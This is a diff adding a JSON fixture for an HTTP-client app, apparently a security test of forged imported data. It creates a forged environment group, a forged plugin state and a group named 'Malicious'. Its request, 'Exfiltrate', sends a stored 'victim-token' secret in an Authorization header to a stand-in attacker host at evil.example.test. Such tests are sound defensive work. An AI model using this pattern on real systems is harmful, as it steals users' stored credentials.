@@ -1,0 +1,142 @@
+[
+  {
+    "actor": "user",
+    "at": 1763251200000,
+    "fields": [
+      "*"
+    ],
+    "op": "create",
+    "resourceId": "m-env-group",
+    "restoredFrom": null,
+    "rev": 1,
+    "snapshot": {
+      "body": {},
+      "createdAt": 1763251200000,
+      "createdBy": "user",
+      "deletedAt": null,
+      "description": "",
+      "id": "m-env-group",
+      "kind": "core:group",
+      "name": "Forged env group",
+      "origin": "original",
+      "originRef": null,
+      "parentId": null,
+      "pluginVersion": null,
+      "pos": 0,
+      "rev": 1,
+      "state": "ok",
+      "tags": [],
+      "tree": "env",
+      "updatedAt": 1763251200000,
+      "updatedBy": "user"
+    }
+  },
+  {
+    "actor": "user",
+    "at": 1763251200000,
+    "fields": [
+      "*"
+    ],
+    "op": "create",
+    "resourceId": "m-state",
+    "restoredFrom": null,
+    "rev": 1,
+    "snapshot": {
+      "body": {
+        "params": {
+          "active": "9.9.9"
+        }
+      },
+      "createdAt": 1763251200000,
+      "createdBy": "user",
+      "deletedAt": null,
+      "description": "",
+      "id": "m-state",
+      "kind": "core:plugin-state",
+      "name": "Forged plugin state",
+      "origin": "original",
+      "originRef": null,
+      "parentId": null,
+      "pluginVersion": null,
+      "pos": 1,
+      "rev": 1,
+      "state": "ok",
+      "tags": [],
+      "tree": "plugin-state",
+      "updatedAt": 1763251200000,
+      "updatedBy": "user"
+    }
+  },
+  {
+    "actor": "user",
+    "at": 1763251200000,
+    "fields": [
+      "*"
+    ],
+    "op": "create",
+    "resourceId": "m-group",
+    "restoredFrom": null,
+    "rev": 1,
+    "snapshot": {
+      "body": {},
+      "createdAt": 1763251200000,
+      "createdBy": "user",
+      "deletedAt": null,
+      "description": "",
+      "id": "m-group",
+      "kind": "core:group",
+      "name": "Malicious",
+      "origin": "original",
+      "originRef": null,
+      "parentId": null,
+      "pluginVersion": null,
+      "pos": 2,
+      "rev": 1,
+      "state": "ok",
+      "tags": [],
+      "tree": "resources",
+      "updatedAt": 1763251200000,
+      "updatedBy": "user"
+    }
+  },
+  {
+    "actor": "user",
+    "at": 1763251200000,
+    "fields": [
+      "*"
+    ],
+    "op": "create",
+    "resourceId": "m-req",
+    "restoredFrom": null,
+    "rev": 1,
+    "snapshot": {
+      "body": {
+        "body": "",
+        "headers": "Authorization: Bearer {{secret:victim-token}}",
+        "method": "GET",
+        "token": {
+          "secret": "victim-key"
+        },
+        "url": "http://evil.example.test:8080/steal"
+      },
+      "createdAt": 1763251200000,
+      "createdBy": "user",
+      "deletedAt": null,
+      "description": "",
+      "id": "m-req",
+      "kind": "org.onedesk.http:request",
+      "name": "Exfiltrate",
+      "origin": "original",
+      "originRef": null,
+      "parentId": "m-group",
+      "pluginVersion": "0.1.0",
+      "pos": 0,
+      "rev": 1,
+      "state": "ok",
+      "tags": [],
+      "tree": "resources",
+      "updatedAt": 1763251200000,
+      "updatedBy": "user"
+    }
+  }
+]
